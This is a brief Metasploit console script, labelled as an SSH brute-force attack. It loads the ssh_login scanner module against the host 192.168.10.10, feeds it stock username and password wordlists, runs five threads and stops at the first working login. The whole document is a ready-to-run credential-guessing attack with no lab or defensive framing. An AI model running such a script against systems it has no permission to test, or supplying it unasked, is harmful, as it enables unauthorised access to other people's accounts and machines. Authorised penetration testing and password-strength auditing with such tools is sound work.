# Metasploit script for SSH brute-force attack
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.10.10
set USER_FILE /usr/share/wordlists/metasploit/user.txt
set PASS_FILE /usr/share/wordlists/metasploit/pass.txt
set THREADS 5
set STOP_ON_SUCCESS true
run